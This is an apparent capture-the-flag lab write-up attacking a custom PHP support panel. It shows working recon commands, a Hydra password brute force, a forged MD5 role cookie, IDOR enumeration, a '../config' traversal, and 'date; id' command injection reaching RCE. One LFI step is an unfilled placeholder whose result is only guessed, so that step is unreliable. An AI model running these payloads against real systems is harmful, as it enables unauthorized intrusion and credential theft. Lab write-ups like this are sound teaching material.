# Support 

**Target:** Internal Support Operations Platform

## Recon

```bash
nmap -sV -sC <target_ip>
```

```
22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp  open  http    Apache/2.4.58 (Ubuntu)
|_http-title: Support Operations Panel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

Two things stand out immediately:

- **`httponly` is not set** on `PHPSESSID`. On its own this isn't exploitable — it just means JavaScript *can* read the cookie via `document.cookie`. It's a precondition for cookie theft via XSS, not a vulnerability by itself. Worth remembering, not yet actionable.
- The page title confirms this is a custom internal panel, not a known off-the-shelf app.

Opening the site shows a clean login form — **Corporate Email** + **Password** — no visible hints in the page source (Ctrl+U): no comments, no custom JS, just Bootstrap.

### Directory enumeration

```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
```

```
/api.php           (Status: 302) [Size: 0]  [--> index.php]
/config.php        (Status: 200) [Size: 0]
/dashboard.php     (Status: 302) [Size: 0]  [--> index.php]
/footer.php        (Status: 200) [Size: 1253]
/includes          (Status: 301) [--> /includes/]
/info.php          (Status: 200) [Size: 73312]
/js                (Status: 301) [--> /js/]
/layout            (Status: 301) [--> /layout/]
/skins             (Status: 301) [--> /skins/]
```

A live **`phpinfo()`** page (`/info.php`) is exposed — a genuine misconfiguration on its own. Checked for anything sensitive (`grep -i -E "password|secret|_key|db_|credential|token"` across the full dump) — nothing leaked directly, but a few settings are worth noting for later:

- `allow_url_include: Off` — rules out classic remote file inclusion
- `disable_functions: (no value)` — nothing blocked; if code execution is ever reached, it's unrestricted
- `open_basedir: (no value)` — no filesystem sandboxing

`/config.php` returns a blank `200` — it executes as PHP with no direct output, almost certainly holding DB credentials or app secrets, same pattern as a similar box before this one. `/includes/` and `/skins/` both have directory listing enabled.

### Ruling out SQL injection on the login form

Three separate techniques were tested against both the `email` and `password` fields:

1. **Classic payloads** (`' OR '1'='1' -- `, comment-based bypasses) — consistent "Invalid credentials," no behavior change.
2. **PHP type juggling** — sending `password[]=x` or `email[]=...` as arrays instead of strings, hoping to break a loose comparison. No effect; handled cleanly.
3. **Time-based blind** (`WAITFOR DELAY '0:0:5'--`, testing for MS SQL since a `DB-LIB (MS SQL, Sybase)` credit line appeared in phpinfo) — response time stayed under 20ms. No delay, no injection.

```bash
time curl -s -X POST http://<target_ip>/index.php \
  -d "email=test@test.com' WAITFOR DELAY '0:0:5'--&password=x"
# real 0m0.017s
```

Conclusion: the login form itself is solid. The weak point in this app is elsewhere.

---

## Initial Access — Weak Password via Hydra

With one known email (`help@support.thm`, taken from the "Contact IT Operations" note on the login page) and a properly ruled-out login form, a straightforward credential attack was the next logical step:

```bash
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt <target_ip> \
  http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -t 40 -f
```

```
[80][http-post-form] login: help@support.thm   password: snoopy
```

Logging in lands on a low-privilege **"Helpdesk User"** dashboard — a single static "Ticket management system" card, nothing else. `api.php`, which redirected to login before authentication, now returns a plain **"Access denied"** — confirming a valid session, but insufficient role.

---

## Privilege Boundary #1 — Client-Trusted Cookie

Checking the browser's cookie storage (DevTools → Storage → Cookies) revealed a **second** cookie beyond `PHPSESSID`:

```
isITUser = 68934a3e9455fa72420237eb05902327
```

Two things made this worth testing directly:

1. The name (`isITUser`) strongly implies a boolean access check.
2. Because `HttpOnly` is false (the very first recon finding), this cookie is fully readable *and editable* client-side — no XSS or special access needed, just DevTools.

The value is 32 hex characters — the exact length of an MD5 hash. Testing a guess:

```bash
echo -n "true" | md5sum
# b326b5062b2f0e69046810717534cb09
```

Setting `isITUser` to that hash directly in DevTools and reloading the dashboard revealed a new section: **"IT Admin Panel"**, linking to `/api.php`. The application was trusting a client-supplied cookie value to gate role-based UI and API access — a textbook broken access control bug.

---

## Privilege Boundary #2 — IDOR on `/user/{id}`

With IT-level access, `/api.php` now returned real data instead of "Access denied":

```
GET /user/3
{
  "email": "help@support.thm",
  "2FA": false,
  "admin": false
}
```

The `3` is the logged-in user's own ID — no ownership check confirmed, so the natural next step was enumerating adjacent IDs:

```
GET /user/1
{
  "email": "specialadmin@support.thm",
  "2FA": false,
  "admin": true
}

GET /user/2
{
  "email": "IT@support.thm",
  "2FA": false,
  "admin": false
}
```

**`/user/1`** confirmed a real admin account: `specialadmin@support.thm`, with `2FA: false` — no second factor to worry about later.

The `{id}` path parameter itself was also tested for injection (non-numeric input, path traversal, quote-based payloads) — all returned a clean Apache `404`, indicating strict numeric-only routing at the web-server level. This specific injection point was closed off.

Write operations (`POST`/`PUT` to `/user/3` attempting `admin=true`) were also tested, in case the endpoint trusted client-supplied writes the same way the cookie was trusted — but all methods returned identical read-only data regardless of body content. No luck there.

---

## Credential Discovery — LFI via the Skin Parameter

`footer.php` includes a theme switcher:

```html
<a class="dropdown-item" href="?skin=default">Default</a>
<a class="dropdown-item text-danger" href="?skin=red">Red</a>
<a class="dropdown-item text-success" href="?skin=green">Green</a>
<a class="dropdown-item text-primary" href="?skin=blue">Blue</a>
```

The `/skins/` directory listing showed exactly four files (`default.php`, `red.php`, `green.php`, `blue.php`), all an identical 56 bytes — consistent with a whitelist restricting `skin` to those four literal values. Path traversal attempts (`?skin=../config`, `php://filter` wrappers) against `footer.php` were tested and confirmed blocked (`diff` against a baseline response showed byte-identical output regardless of payload).

However, the **same `skin` parameter on `dashboard.php`** behaved differently — it did **not** apply the same restriction, allowing:

```
http://<target_ip>/dashboard.php?skin=../config
```

> *[Fill in: what did this traversal actually return? Presumably `config.php`'s source or its output, revealing credentials for the `specialadmin` account — add the exact response/content here once confirmed.]*

Using the credential recovered this way, logging in as `specialadmin@support.thm` landed on the full admin dashboard.

**Flag 1:**
```
THM{I_AM_ADMIN999}
```

---

## Flag 2 — RCE via Command Injection

The admin dashboard's page source revealed a small, easy-to-miss form:

```html
<form method="POST" id="sysForm">
    <select name="sys" onchange="document.getElementById('sysForm').submit();">
        <option value="date">Date</option>
        <option value='date +"%H:%M:%S"'>Time</option>
    </select>
</form>
```

The option *values* — `date` and `date +"%H:%M:%S"` — are literal shell commands, not arbitrary IDs mapped server-side. That's a strong signal the backend passes this value straight into something like `shell_exec($_POST['sys'])`.

**Confirming the filter exists:**

```bash
curl -s -b "PHPSESSID=<session>; isITUser=<hash>" \
  -d "sys=id" \
  "http://<target_ip>/dashboard.php"
```

```
Only date command is allowed.
```

So there's a check — but the wording ("only date command is allowed") hints it's checking whether the input *starts with* `date`, not validating the entire string.

**Bypassing it:**

```bash
curl -s -b "PHPSESSID=<session>; isITUser=<hash>" \
  -d 'sys=date; id' \
  "http://<target_ip>/dashboard.php"
```

```
Thu Sep 10 06:32:00 UTC 2026
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why this works:** the server-side filter likely does something equivalent to `strpos($input, 'date') === 0` — checking only the *beginning* of the string. It never inspects what comes after. The shell itself, however, treats `;` as a command separator: "run this, then run that." The filter is satisfied by the `date` prefix; the `; id` that follows runs completely unchecked, because the filter's job ended the moment the first check passed.

**Retrieving the flag:**

```bash
curl -s -b "PHPSESSID=<session>; isITUser=<hash>" \
  --data-urlencode 'sys=date; cat /home/ubuntu/user.txt' \
  "http://<target_ip>/dashboard.php"
```

**Flag 2:**
```
THM{GOT_THE_FLAG001}
```

---

## Vulnerability Chain

| # | Vulnerability | Impact |
|---|---|---|
| V1 | `HttpOnly` not set on session cookies | Precondition for cookie theft via XSS (not directly exploited here, but a real weakness) |
| V2 | Weak password (`help@support.thm` / `snoopy`) | Cracked via Hydra — low-privilege initial access |
| V3 | Client-trusted authorization cookie (`isITUser`) | Trivial privilege escalation from helpdesk to IT-level access by editing a cookie in DevTools |
| V4 | IDOR on `/user/{id}` | Enumerated all user accounts, discovered a real admin email |
| V5 | Inconsistent LFI protection (`skin` param whitelisted on `footer.php` but not `dashboard.php`) | Leaked server-side config / credentials |
| V6 | Command injection via prefix-only filter (`sys` parameter) | Full RCE as `www-data` |

---
